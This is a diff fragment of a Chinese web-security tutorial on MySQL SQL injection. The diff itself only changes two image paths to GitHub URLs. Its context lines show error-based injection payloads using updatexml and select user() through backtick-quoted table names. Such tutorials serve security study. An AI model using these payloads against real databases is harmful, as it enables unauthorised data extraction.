@@ -838,7 +838,7 @@ user` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
 select * from message `` where updatexml(1,concat(0x7e,(select user()),0x7e),1)#; where 1=1;
 ```
 
-![mysql_sql-1](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/mysql_sql-1.jpg)
+![mysql_sql-1](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/mysql_sql-1.jpg)
 
 **表名不完全可控且DESC的表名不含反引号，SELECT的表名含有反引号**
 
@@ -869,7 +869,7 @@ user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
 select * from `shop_user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`` where 1=1
 ```
 
-![mysql_sql-2](/Users/linlsec/Desktop/linlsec.github.io/images/Web安全/mysql_sql-2.jpg)
+![mysql_sql-2](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/mysql_sql-2.jpg)
 
 #### 无列名注入
 
